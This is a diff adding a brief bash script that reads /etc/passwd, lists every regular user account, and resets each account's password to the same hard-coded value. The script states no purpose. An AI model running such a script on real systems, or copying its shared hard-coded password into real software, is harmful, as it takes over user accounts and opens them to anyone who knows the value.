@@ -1,0 +1,7 @@
+#!/bin/bash
+
+awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd > /usr/local/src/user_names.txt
+
+while read line; do
+	echo -e "7035efa5\\n7035efa5" | passwd $line
+done</usr/local/src/user_names.txt
